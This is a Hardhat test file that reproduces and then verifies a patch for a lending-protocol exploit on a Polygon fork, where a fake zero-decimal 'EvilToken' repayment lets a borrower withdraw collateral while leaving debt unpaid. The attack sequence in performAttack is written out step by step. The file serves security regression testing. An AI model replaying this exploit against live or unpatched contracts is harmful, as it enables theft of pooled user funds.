import { loadContract } from '@deployments/src';
import {
  ArcProxyFactory,
  EvilToken,
  EvilTokenFactory,
  SapphireCoreV1,
  SapphireCoreV1Factory,
  SapphirePool,
  SapphirePoolFactory,
} from '@src/typings';
import { IERC20 } from '@src/typings/IERC20';
import { IERC20Factory } from '@src/typings/IERC20Factory';
import { addSnapshotBeforeRestoreAfterEach } from '@test/helpers/testingUtils';
import { expect } from 'chai';
import { Signer, utils } from 'ethers';
import hre from 'hardhat';

const CREDIT_SCORE_PROOF = {
  account: '0xAD7b45345AFEEbD6755b5799C1B991306E4e5A43',
  protocol:
    '0x617263782e637265646974000000000000000000000000000000000000000000',
  score: 0,
  merkleProof: [],
};
const CREDIT_LIMIT_PROOF = {
  account: '0xAD7b45345AFEEbD6755b5799C1B991306E4e5A43',
  protocol:
    '0x617263782e6c696d69742e3133372e776574682e610000000000000000000000',
  score: '10000000000000000000000',
  merkleProof: [
    '0x6b211d7e1527de210746842ff6a28405fad652aa5da1368aea552819ea573e52',
    '0xe5c564f9ae708dcb7836326848f564f7b5ec9b979e6f5836f6c00d41baf017e9',
    '0xd32c1ac5abcf875de3840ade78acdf5f0d3d4338d735bd22220fac3c7f20fb15',
    '0x06cab26b07694f241fafaa48f62b7a4f4ce8048c189355b1d343f7e56f1be88a',
    '0xcbb933905b4d96592b82d140553f2f0535768463260352363f5e5bd30e054971',
    '0x868d945a98aae04d4fec975ecde584b571f617328a08107f800de2e70a6d2a5b',
    '0xfb3e3bba5dbd2b1c235e81694899e54b3230cd5f7f8fdd5901a3bb654e568d65',
    '0x7f6280139a0154e44fa7943b1bb4e91cd191f315630b19913a2c9602bb329592',
    '0xcca4efd2e11eba1759af4c5c29b5f66dc3744298eab4ba9262e76cc068fdc599',
    '0x9b8f30b20cff2fdd26fb8211ae97cd7cca35641d669a92fcbb9c7b9ecab3e4ec',
    '0x2821b43bac5e97552d14f84b7965d74ab754b201498059627ee51baa51a4e56e',
    '0xca4e18653652d1b1b5cfae481179e9731a7507c875c07f6778dc80d499eea55f',
  ],
};
const COLLATERAL_AMOUNT = utils.parseEther('0.001');
const USDC_BORROW_AMOUNT = utils.parseUnits('0.999', 6);

/**
 * This is an upgrade test to patch a security vulnerability allowing an attacker to clear his < $1
 * debt by repaying with an bogus token that reports 0 decimals.
 */
describe('SapphireCore - V2 Upgrade', () => {
  const attackerAddress = '0xad7b45345afeebd6755b5799c1b991306e4e5a43';
  let attacker: Signer;
  let core: SapphireCoreV1;
  let pool: SapphirePool;
  let weth: IERC20;
  let usdc: IERC20;
  let evilToken: EvilToken;

  async function performAttack() {
    // console.log('\ninitial balances');
    const initialWethBalance = await weth.balanceOf(attackerAddress);
    const initialUsdcBalance = await usdc.balanceOf(attackerAddress);
    // console.log('balance WETH', utils.formatEther(initialWethBalance));
    // console.log('balance USDC', utils.formatUnits(initialUsdcBalance, 6));

    // console.log('\n\ndeposit...');
    await core.deposit(COLLATERAL_AMOUNT, [
      CREDIT_SCORE_PROOF,
      CREDIT_LIMIT_PROOF,
    ]);
    // console.log(
    //   'balance WETH',
    //   utils.formatEther(await weth.balanceOf(attackerAddress)),
    // );
    // console.log(
    //   'balance USDC',
    //   utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
    // );

    // console.log('\n\nborrow...');
    await core.borrow(
      USDC_BORROW_AMOUNT,
      // USDC = borrowed asset
      '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
      [CREDIT_SCORE_PROOF, CREDIT_LIMIT_PROOF],
    );
    // console.log(
    //   'balance WETH',
    //   utils.formatEther(await weth.balanceOf(attackerAddress)),
    // );
    // console.log(
    //   'balance USDC',
    //   utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
    // );
    let vault = await core.vaults(attackerAddress);
    expect(vault.principal).to.eq(USDC_BORROW_AMOUNT.mul(1e12));
    // console.log('principal', utils.formatEther(vault.principal));

    // Increase time to accumulate some interest.
    // console.log('Increase time...');
    await hre.network.provider.send('evm_increaseTime', [60 * 20]);

    // console.log('\n\nrepay with Evil Token...');
    // This should be reverted in theory, but it's not
    await core.repay('1', evilToken.address, [
      CREDIT_SCORE_PROOF,
      CREDIT_LIMIT_PROOF,
    ]);
    vault = await core.vaults(attackerAddress);
    // console.log(
    //   'balance WETH',
    //   utils.formatEther(await weth.balanceOf(attackerAddress)),
    // );
    // console.log(
    //   'balance USDC',
    //   utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
    // );
    expect(vault.principal).to.eq(USDC_BORROW_AMOUNT.mul(1e12));
    // console.log('principal', utils.formatEther(vault.principal));

    // Withdraw the initial collateral
    // console.log('\n\nwithdraw...');
    await core.withdraw(COLLATERAL_AMOUNT, [
      CREDIT_SCORE_PROOF,
      CREDIT_LIMIT_PROOF,
    ]);

    // console.log('\n\nFinal balances');
    const finalWeth = await weth.balanceOf(attackerAddress);
    const finalUsdc = await usdc.balanceOf(attackerAddress);
    vault = await core.vaults(attackerAddress);
    expect(finalWeth).to.eq(initialWethBalance);
    expect(finalUsdc).to.eq(initialUsdcBalance.add(USDC_BORROW_AMOUNT));
    // The principal is still the same but the attacker is still able to withdraw the full amount
    // of his collateral!
    expect(vault.principal).to.eq(USDC_BORROW_AMOUNT.mul(1e12));
    expect(vault.collateralAmount).to.eq(0);

    // console.log('balance WETH', utils.formatEther(finalWeth));
    // console.log('balance USDC', utils.formatUnits(finalUsdc, 6));
    // console.log('principal', utils.formatEther(vault.principal));
    // console.log('collateral', utils.formatEther(vault.collateralAmount));
  }

  before(async () => {
    await hre.network.provider.request({
      method: 'hardhat_reset',
      params: [
        {
          forking: {
            jsonRpcUrl: process.env.POLYGON_ALCHEMY,
            blockNumber: 34967700,
          },
        },
      ],
    });

    // This attack simulates an account that has a positive credit limit
    await hre.network.provider.request({
      method: 'hardhat_impersonateAccount',
      params: [attackerAddress],
    });
    attacker = await hre.ethers.provider.getSigner(attackerAddress);

    core = SapphireCoreV1Factory.connect(
      loadContract({
        name: 'SapphireCoreProxy',
        network: 'polygon',
        group: 'WETH-A',
      }).address,
      attacker,
    );
    pool = SapphirePoolFactory.connect(await core.borrowPool(), attacker);
    weth = IERC20Factory.connect(
      '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
      attacker,
    );
    usdc = IERC20Factory.connect(
      '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
      attacker,
    );
    evilToken = await new EvilTokenFactory(attacker).deploy();
  });

  addSnapshotBeforeRestoreAfterEach();

  it('Confirms the attack scenario', async () => {
    // Confirm that evil token is not whitelisted
    expect(
      (await pool.assetDepositUtilization(evilToken.address)).limit,
    ).to.be.eq(0);
    expect(await pool.getDepositAssets()).to.not.include(evilToken.address);

    const initialWethBalance = await weth.balanceOf(attackerAddress);
    const initialUsdcBalance = await usdc.balanceOf(attackerAddress);

    await performAttack();

    const finalWeth = await weth.balanceOf(attackerAddress);
    const finalUsdc = await usdc.balanceOf(attackerAddress);
    expect(finalWeth).to.eq(initialWethBalance);
    // The attacker was able to get away with more than the initial balance
    expect(finalUsdc).to.eq(initialUsdcBalance.add(USDC_BORROW_AMOUNT));
  });

  it('fixes the attack', async () => {
    // Confirm that evil token is not whitelisted
    expect(
      (await pool.assetDepositUtilization(evilToken.address)).limit,
    ).to.be.eq(0);
    expect(await pool.getDepositAssets()).to.not.include(evilToken.address);

    /* ---------------------------- Upgrade contract ---------------------------- */
    const adminAddress = await core.getAdmin();

    await hre.network.provider.request({
      method: 'hardhat_impersonateAccount',
      params: [adminAddress],
    });
    await hre.network.provider.send('hardhat_setBalance', [
      adminAddress,
      utils.parseEther('1').toHexString().replace('0x0', '0x'),
    ]);

    const admin = await hre.ethers.provider.getSigner(adminAddress);
    const fixedCoreImpl = await new SapphireCoreV1Factory(admin).deploy();
    await ArcProxyFactory.connect(core.address, admin).upgradeTo(
      fixedCoreImpl.address,
    );

    /* -------------------------- Try the attack again -------------------------- */
    await performAttack().catch((err) => {
      expect(err).to.match(
        /VM Exception while processing transaction: reverted with reason string 'SapphireCoreV1: not an approved asset'/,
      );
    });
  });
});
